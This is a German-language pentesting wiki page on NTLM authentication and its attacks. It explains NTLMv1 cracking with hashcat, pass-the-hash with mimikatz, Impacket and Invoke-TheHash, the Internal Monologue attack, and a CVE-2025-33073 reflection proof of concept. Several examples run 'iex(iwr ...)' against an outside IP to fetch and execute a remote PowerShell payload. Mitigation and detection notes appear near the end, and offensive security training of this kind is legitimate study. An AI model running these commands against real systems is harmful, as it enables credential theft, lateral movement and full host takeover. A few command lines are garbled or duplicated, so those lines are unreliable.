# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

In Umgebungen, in denen **Windows XP und Server 2003** eingesetzt werden, kommen LM-Hashes (Lan Manager) zum Einsatz, obwohl allgemein bekannt ist, dass diese leicht kompromittiert werden können. Ein bestimmter LM-Hash, `AAD3B435B51404EEAAD3B435B51404EE`, weist darauf hin, dass LM nicht verwendet wird und den Hash für eine leere Zeichenfolge darstellt.

Standardmäßig ist das **Kerberos**-Authentifizierungsprotokoll die primäre Methode. NTLM (NT LAN Manager) kommt unter bestimmten Umständen zum Einsatz: wenn Active Directory fehlt, die Domäne nicht existiert, Kerberos aufgrund einer fehlerhaften Konfiguration nicht funktioniert oder Verbindungen über eine IP-Adresse statt über einen gültigen Hostnamen hergestellt werden.

Der **„NTLMSSP“**-Header in Netzwerkpaketen weist auf einen NTLM-Authentifizierungsprozess hin.

Die Authentifizierungsprotokolle LM, NTLMv1 und NTLMv2 werden von einer bestimmten DLL unter `%windir%\Windows\System32\msv1\_0.dll` unterstützt.

**Wichtige Punkte**:

- LM-Hashes sind anfällig, und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) bedeutet, dass LM nicht verwendet wird.
- Kerberos ist die Standardauthentifizierungsmethode. NTLM wird nur unter bestimmten Bedingungen verwendet.
- NTLM-Authentifizierungspakete sind am Header „NTLMSSP“ erkennbar.
- Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.

## LM, NTLMv1 und NTLMv2

Du kannst prüfen und konfigurieren, welches Protokoll verwendet wird:

### GUI

Führe _secpol.msc_ aus -> Lokale Richtlinien -> Sicherheitsoptionen -> Netzwerksicherheit: LAN Manager-Authentifizierungsebene. Es gibt 6 Ebenen (von 0 bis 5).

![LM, NTLMv1 und NTLMv2 - GUI: Führe secpol.msc aus - Lokale Richtlinien - Sicherheitsoptionen - Netzwerksicherheit: LAN Manager-Authentifizierungsebene. Es gibt 6 Ebenen (von 0 bis 5)](<../../images/image (919).png>)

### Registry

Damit wird Ebene 5 festgelegt:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Mögliche Werte:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Einfaches NTLM-Domänenauthentifizierungsschema

1. Der **Benutzer** gibt seine **Anmeldedaten** ein
2. Der Clientcomputer **sendet eine Authentifizierungsanfrage** mit dem **Domänennamen** und dem **Benutzernamen**
3. Der **Server** sendet die **Challenge**
4. Der **Client verschlüsselt** die **Challenge** mit dem Hash des Passworts als Schlüssel und sendet sie als Response
5. Der **Server sendet** dem **Domänencontroller** den **Domänennamen, den Benutzernamen, die Challenge und die Response**. Wenn **kein** Active Directory konfiguriert ist oder der Domänenname dem Servernamen entspricht, werden die Anmeldedaten **lokal überprüft**.
6. Der **Domänencontroller überprüft, ob alles korrekt ist**, und sendet die Informationen an den Server

Der **Server** und der **Domänencontroller** können über den Netlogon-Server einen **Secure Channel** einrichten, da der Domänencontroller das Passwort des Servers kennt (es befindet sich in der **NTDS.DIT**-Datenbank).

### Lokales NTLM-Authentifizierungsschema

Die Authentifizierung läuft wie **zuvor beschrieben** ab, aber der **Server** kennt den **Hash des Benutzers**, der sich authentifizieren möchte, aus der **SAM**-Datei. Statt den Domänencontroller zu fragen, **überprüft der Server selbst**, ob sich der Benutzer authentifizieren kann.

### NTLMv1-Challenge

Die **Challenge ist 8 Byte lang** und die **Response 24 Byte**.

Der **NT-Hash (16 Byte)** wird in **3 Teile zu je 7 Byte** aufgeteilt (7B + 7B + (2B+0x00\*5)): Der **letzte Teil wird mit Nullen aufgefüllt**. Anschließend wird die **Challenge** separat mit jedem Teil **verschlüsselt** und die **verschlüsselten** Bytes werden **aneinandergehängt**. Insgesamt: 8B + 8B + 8B = 24 Byte.

**Probleme**:

- Fehlende **Zufälligkeit**
- Die 3 Teile können **separat angegriffen** werden, um den NT-Hash zu ermitteln
- **DES ist knackbar**
- Der Schlüssel des dritten Teils besteht immer aus **5 Nullen**.
- Bei derselben **Challenge** ist auch die **Response** immer **gleich**. Du kannst dem Opfer also den String "**1122334455667788**" als **Challenge** senden und die Response mithilfe **vorberechneter Rainbow Tables** angreifen.

### NTLMv1-Angriff

Unconstrained delegation ist in modernen Umgebungen weniger verbreitet, aber ein erreichbarer **Print Spooler-Dienst** kann weiterhin missbraucht werden, um eine Authentifizierung zu einem solchen Host zu erzwingen.

Du kannst bestimmte Anmeldedaten/Sitzungen, über die du bereits in der AD verfügst, missbrauchen, um **den Drucker zur Authentifizierung** bei einem **Host unter deiner Kontrolle** aufzufordern. Mit `metasploit auxiliary/server/capture/smb` oder `responder` kannst du dann die **Authentifizierungs-Challenge auf 1122334455667788 setzen**, den Authentifizierungsversuch abfangen und ihn **knacken**, wenn er mit **NTLMv1** durchgeführt wurde.\
Wenn du `responder` verwendest, kannst du versuchen, das Flag `--lm` zu verwenden, um die **Authentifizierung** **herabzustufen**.\
_Hinweis: Für diese Technik muss die Authentifizierung mit NTLMv1 durchgeführt werden (NTLMv2 ist nicht geeignet)._

Denk daran, dass der Drucker während der Authentifizierung das Computerkonto verwendet. Computerkonten haben **lange und zufällige Passwörter**, die du mit üblichen **Wörterbüchern** **wahrscheinlich nicht knacken kannst**. Die **NTLMv1**-Authentifizierung **verwendet jedoch DES** ([weitere Informationen hier](#ntlmv1-challenge)). Mit speziell auf das Knacken von DES ausgelegten Diensten kannst du es daher knacken (zum Beispiel mit [https://crack.sh/](https://crack.sh) oder [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1-Angriff mit hashcat

NTLMv1 kann auch mit [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) angegriffen werden, das abgefangene NTLMv1-Nachrichten in für Hashcat geeignete Formate umwandelt.<sup>[[1]](#references)</sup>

Der Befehl

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

würde Folgendes ausgeben:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Erstelle eine Datei mit folgendem Inhalt:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Führe hashcat aus (am besten verteilt über ein Tool wie hashtopolis), da es sonst mehrere Tage dauern wird.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

In diesem Fall kennen wir das Passwort dafür, nämlich password, also schummeln wir zu Demo-Zwecken:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Nun müssen wir die hashcat-utilities verwenden, um die geknackten DES-Schlüssel in Teile des NTLM-Hashes umzuwandeln:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Zum Schluss der letzte Teil:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Führe sie zusammen:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

Die **Challenge-Länge beträgt 8 Bytes** und **es werden 2 Responses gesendet**: Eine ist **24 Bytes** lang, die Länge der **anderen** ist **variabel**.

**Die erste Response** wird erstellt, indem die **Zeichenfolge** aus **Client und Domain** mit **HMAC_MD5** verschlüsselt wird. Als **Key** wird der **MD4-Hash** des **NT-Hashes** verwendet. Das **Ergebnis** wird dann als **Key** verwendet, um die **Challenge** mit **HMAC_MD5** zu verschlüsseln. Dazu wird eine 8 Byte lange **Client-Challenge** hinzugefügt. Insgesamt: 24 B.

**Die zweite Response** wird aus **mehreren Werten** erstellt (einer neuen Client-Challenge, einem **Timestamp**, um **Replay-Angriffe** zu verhindern ...).

Wenn du einen **PCAP mit einem erfolgreichen Authentifizierungsaustausch** hast, extrahiere die Domain, den Benutzernamen, die Server-Challenge und die NTLMv2-Response, formatiere den Mitschnitt für Hashcat und verwende den Modus `5600`, um zu versuchen, das Passwort wiederherzustellen. Die archivierte praktische Anleitung enthält weiterhin das Verfahren zum Extrahieren der Paketfelder, während die Beispiele von Hashcat das aktuell akzeptierte Format definieren.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Sobald du den Hash des Opfers hast**, kannst du ihn verwenden, um dich als dieses Opfer **auszugeben**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mit** diesem **Hash durchführt**, **oder** du kannst eine neue **sessionlogon** erstellen und diesen **Hash** in die **LSASS** **injizieren**, sodass dieser **Hash verwendet wird, wenn eine NTLM-Authentifizierung durchgeführt wird**. Genau das macht mimikatz.

**Denk daran, dass du Pass-the-Hash-Angriffe auch mit Computer-Konten durchführen kannst.**

### **Mimikatz**

**Muss als Administrator ausgeführt werden**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Dieser Befehl startet einen Prozess unter dem aktuellen lokalen Benutzer, während LSASS die angegebenen Anmeldedaten dem ausgehenden Netzwerkanmeldevorgang zuordnet. Anschließend können Sie als angegebener Benutzer auf Netzwerkressourcen zugreifen, ähnlich wie mit `runas /netonly`, ohne das Klartextpasswort zu kennen.

### Pass-the-Hash von Linux

Sie können mit Pass-the-Hash von Linux aus Code auf Windows-Computern ausführen.\
[**Praktische Beispiele zur Ausführung von Pass-the-Hash mit Impacket PsExec ansehen.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Kompilierte Impacket-Tools für Windows

Sie können [hier Impacket-Binärdateien für Windows herunterladen](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In diesem Fall müssen Sie einen Befehl angeben; cmd.exe und powershell.exe sind nicht geeignet, um eine interaktive Shell zu erhalten.)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Es gibt noch mehrere weitere Impacket-Binärdateien ...

### Invoke-TheHash

Sie können die PowerShell-Skripte hier herunterladen: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Diese Funktion kombiniert die vorherigen Modi. Du kannst **mehrere Hosts** angeben, ausgewählte Ziele ausschließen und _SMBExec, WMIExec, SMBClient_ oder _SMBEnum_ auswählen. Wenn du **SMBExec** oder **WMIExec** ohne den Parameter _**Command**_ auswählst, wird lediglich geprüft, ob du über ausreichende Berechtigungen verfügst.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Muss als Administrator ausgeführt werden**

Dieses Tool macht dasselbe wie mimikatz (modifiziert den LSASS-Speicher).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Manuelle Windows-Remote-Ausführung mit Benutzername und Passwort


{{#ref}}
../lateral-movement/
{{#endref}}

## Extrahieren von Credentials von einem Windows-Host

Weitere Informationen finden Sie unter [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

Der Internal Monologue Attack ist eine heimliche Technik zur Extraktion von Credentials, mit der ein Angreifer NTLM-Hashes vom Computer eines Opfers abrufen kann, **ohne direkt mit dem LSASS-Prozess zu interagieren**. Anders als Mimikatz, das Hashes direkt aus dem Arbeitsspeicher ausliest und häufig von Endpoint-Sicherheitslösungen oder Credential Guard blockiert wird, nutzt dieser Angriff **lokale Aufrufe an das NTLM-Authentifizierungspaket (MSV1_0) über die Security Support Provider Interface (SSPI)**. Der Angreifer **stuft zunächst die NTLM-Einstellungen herab** (z. B. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), um NetNTLMv1 zuzulassen. Anschließend imitiert er vorhandene Benutzer-Tokens, die von laufenden Prozessen stammen, und löst lokal eine NTLM-Authentifizierung aus, um mit einer bekannten Challenge NetNTLMv1-Antworten zu erzeugen.<sup>[[4]](#references)</sup>

Nach dem Erfassen dieser NetNTLMv1-Antworten kann der Angreifer die ursprünglichen NTLM-Hashes mithilfe **vorberechneter Rainbow Tables** schnell wiederherstellen und so weitere Pass-the-Hash-Angriffe für Lateral Movement durchführen. Entscheidend ist, dass der Internal Monologue Attack unauffällig bleibt, da er keinen Netzwerkverkehr erzeugt, keinen Code injiziert und keine direkten Speicherabbilder auslöst. Dadurch ist er für Verteidiger schwerer zu erkennen als herkömmliche Methoden wie Mimikatz.

Wird NetNTLMv1 aufgrund erzwungener Sicherheitsrichtlinien nicht akzeptiert, kann der Angreifer möglicherweise keine NetNTLMv1-Antwort abrufen.

Um diesen Fall abzudecken, wurde das Internal Monologue-Tool aktualisiert: Es bezieht dynamisch mit `AcceptSecurityContext()` ein Server-Token, um weiterhin **NetNTLMv2-Antworten zu erfassen**, falls NetNTLMv1 fehlschlägt. NetNTLMv2 ist zwar deutlich schwieriger zu knacken, eröffnet aber dennoch einen Weg für Relay-Angriffe oder Offline-Brute-Force-Angriffe in begrenzten Fällen.

Der PoC ist unter **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** zu finden.<sup>[[4]](#references)</sup>

## NTLM Relay und Responder

**Eine ausführlichere Anleitung zur Durchführung dieser Angriffe finden Sie hier:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## NTLM-Challenges aus einem Netzwerk-Mitschnitt auslesen

**Sie können** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **verwenden.**

## NTLM- und Kerberos-*Reflection* über serialisierte SPNs (CVE-2025-33073)

Windows enthält mehrere Schutzmaßnahmen, die *Reflection*-Angriffe verhindern sollen. Bei solchen Angriffen wird eine von einem Host ausgehende NTLM- (oder Kerberos-)Authentifizierung an denselben Host zurückgeleitet, um SYSTEM-Rechte zu erlangen.  

Microsoft unterband die meisten öffentlich bekannten Angriffsketten mit MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) und späteren Patches. **CVE-2025-33073** zeigt jedoch, dass sich die Schutzmaßnahmen weiterhin umgehen lassen, indem ausgenutzt wird, wie der **SMB-Client Service Principal Names (SPNs)** abschneidet, die *marshalled* (serialisierte) Target-Info enthalten.<sup>[[5]](#references)[[6]](#references)</sup>

### Kurzfassung des Fehlers
1. Ein Angreifer registriert einen **DNS-A-Record**, dessen Label einen marshalled SPN codiert, z. B.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Das Opfer wird dazu gebracht, sich bei diesem Hostnamen zu authentifizieren (PetitPotam, DFSCoerce usw.).
3. Wenn der SMB-Client den Zielstring `cifs/srv11UWhRCAAAAA…` an `lsasrv!LsapCheckMarshalledTargetInfo` übergibt, **entfernt** der Aufruf von `CredUnmarshalTargetInfo` den serialisierten Blob, sodass **`cifs/srv1`** übrig bleibt.
4. `msv1_0!SspIsTargetLocalhost` (oder das entsprechende Kerberos-Pendant) stuft das Ziel nun als *localhost* ein, da der verkürzte Hostnamen dem Computernamen (`SRV1`) entspricht.
5. Daraufhin setzt der Server `NTLMSSP_NEGOTIATE_LOCAL_CALL` und injiziert **das SYSTEM-Zugriffstoken von LSASS** in den Kontext (bei Kerberos wird ein mit SYSTEM markierter Subsession-Key erstellt).
6. Wird diese Authentifizierung mit `ntlmrelayx.py` **oder** `krbrelayx.py` weitergeleitet, erhält man volle SYSTEM-Rechte auf demselben Host.<sup>[[5]](#references)</sup>

### Schneller PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Patches & Mitigations
* Der KB-Patch für **CVE-2025-33073** fügt eine Prüfung in `mrxsmb.sys::SmbCeCreateSrvCall` hinzu, die jede SMB-Verbindung blockiert, deren Ziel marshalled Informationen enthält (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Erzwinge **SMB signing** für SMB-Relay-Ziele. Prüfe bei anderen Zielen die jeweiligen Signing- oder Extended-Protection-Anforderungen des Protokolls und den Patch-Stand; SMB signing allein bestimmt nicht, ob ein HTTPS-WinRM-Relay möglich ist.
* Überwache DNS-Einträge, die dem Muster `*<base64>...*` ähneln, und blockiere Coercion-Vektoren (PetitPotam, DFSCoerce, AuthIP...).

### Erkennungsideen
* Netzwerkaufzeichnungen mit `NTLMSSP_NEGOTIATE_LOCAL_CALL`, bei denen die Client-IP ≠ Server-IP ist.
* Kerberos-AP-REQ mit einem Subsession Key und einem Client Principal, der dem Hostnamen entspricht.
* Windows-Ereignisse 4624/4648 mit SYSTEM-Anmeldungen, auf die unmittelbar Remote-SMB-Schreibvorgänge vom selben Host folgen.<sup>[[5]](#references)</sup>

Ein serialisierter DNS-Name mit Zielinformationen kann die erzwungene Authentifizierung auch zu einem Angreifer umleiten, um ein **Cross-Protocol-Relay** an einen AD-CS-Web-Enrollment-Endpunkt durchzuführen. Dies ist ein separates Ergebnis gegenüber einer Same-Host-Reflection: Die [ESC8-Enrollment-Bedingungen](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS-Schreibrechte, ein Coercion-Pfad und der Patch-Stand des Ziels müssen unabhängig voneinander bewertet werden.

Zur **März-2026**-Variante der lokalen Reflection, die **SMB-Arbitrary-Ports** und **TCP-Verbindungswiederverwendung** missbraucht, um `NT AUTHORITY\SYSTEM` zu erreichen, siehe:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat-Beispiel-Hashes – NetNTLMv2 (Modus 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell-Pass-The-Hash-Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal-Monologue-Angriff: NTLM-Hashes abrufen, ohne LSASS anzufassen](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM-Reflection ist tot, lang lebe NTLM-Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Einen NTLMv2-Hash knacken – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
